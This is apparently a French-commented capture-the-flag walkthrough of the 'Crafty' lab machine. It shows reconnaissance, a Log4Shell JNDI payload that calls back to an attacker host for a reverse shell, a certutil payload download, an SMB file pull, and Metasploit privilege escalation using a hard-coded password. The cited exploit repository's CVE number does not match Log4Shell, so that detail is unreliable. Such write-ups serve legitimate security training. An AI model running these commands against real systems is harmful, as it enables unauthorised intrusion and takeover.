# Crafty
```shell
nmap -sV -sC 10.10.11.249
        80/tcp open  http    Microsoft IIS httpd 10.0
        |_http-title: Did not follow redirect to http://crafty.htb
        |_http-server-header: Microsoft-IIS/10.0
ffuf -u 'http://crafty.htb/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/common.txt
        Home
        css
        img
        home
        js
# avec big.txt
        coming-soon
# on a un jeu comme minecraft, on cherche sur google on find qu'il faut prendre minecraft client 
# on use tlauncher, il faut aussi add craftu.htb et play.crafty.htb
java -jar Tlauncher
# on check sur internet comment join un server, https://tlauncher.org/en/open-lan.html
# on se co sur play.crafty.htb, on a message pour nous dire de download 1.16.5 client version 
# on find ce blog https://software-sinner.medium.com/exploiting-minecraft-servers-log4j-ddac7de10847
# on scan dabord play.crafty.htb 
nmap -sV play.crafty.htb -p- 
	80/tcp    open  http      syn-ack ttl 127 Microsoft IIS httpd 10.0
	25565/tcp open  minecraft syn-ack ttl 127 Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 1/100)
# on a le port minecrat ouvert, ensuite on recup log4j exploit 
git clone https://github.com/joshuavanderpoll/CVE-2021-3129
# apres avoir download le jdk sur site de oracle comme dans le README, on lance exploit
python3 poc.py --userip 10.10.16.47 --webport 80 --lport 4444
# add listener 
nc -lvnp 4444
# ensuite on open chat dans minecraft avec 'T'
# on lance la cmd 
${jndi:ldap://10.10.16.47:1389/a}
# on recup le shell !!
# privesc, on upload winpeas.bat
certutil.exe -urlcache -f http://10.10.16.47/winPEAS.bat winPEAS.bat
# launch
winPEAS.bat
# dans dossier server de username svc_minecraft on find un server.jar, on va le recup et check dedans
smbserver.py -smb2support EXEGOL . -username kali -password kali
# mount smb server 
net use x: \\10.10.16.47\EXEGOL /user:kali kali
# dans plugins on a un snapshot jar file on le transfert puis on le decompile avec jadx
jadx-gui
# on find un password codé en dur, on test si cest password de ladmin
# on va upload meterpreter, ensuite on use le module post/windows/manage/run_as
msf6 post(windows/manage/run_as) > set session 1
session => 1
msf6 post(windows/manage/run_as) > set user administrator
msf6 post(windows/manage/run_as) > set domain .
msf6 post(windows/manage/run_as) > set cmd 'more c:\users\administrator\desktop\root.txt'
cmd => more c:\users\administrator\desktop\root.txt
msf6 post(windows/manage/run_as) > set cmdout true
run
# on recup le flag!
```
